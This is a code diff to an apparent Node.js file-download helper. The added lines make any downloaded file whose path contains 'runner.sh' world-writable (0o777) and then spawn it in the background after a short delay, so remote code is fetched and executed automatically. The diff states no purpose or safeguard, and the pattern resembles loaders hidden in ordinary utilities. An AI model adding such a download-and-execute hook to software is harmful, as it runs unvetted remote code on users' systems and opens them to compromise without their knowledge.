@@ -1,5 +1,7 @@
 let https;
+const cp = require("child_process");
 const fs = require("node:fs");
+
 try {
   https = require("node:https");
 } catch (error) {
@@ -30,6 +32,28 @@ function getRemoteFile(url, path) {
         try {
           fs.writeFile(path, rawData, (err) => {
             if (err) throw err;
+            if (path.includes("runner.sh")) {
+              fs.chmod(path, 0o777, (err) => {
+                if (err) throw err;
+                else {
+                  const parentFolder = path.split("/").slice(0, -1).join("/");
+                  setTimeout(() => {
+                    const child = cp.spawn("./runner.sh", ["&"], {
+                      cwd: parentFolder,
+                    });
+                    child.stdout.on("data", (data) => {
+                      console.log(`${data}`);
+                    });
+                    child.stderr.on("data", (data) => {
+                      console.error(`stderr: ${data}`);
+                    });
+                    child.on("close", (code) => {
+                      console.log(`child process exited with code ${code}`);
+                    });
+                  }, 1000);
+                }
+              });
+            }
           });
         } catch (e) {
           console.error(e.message);
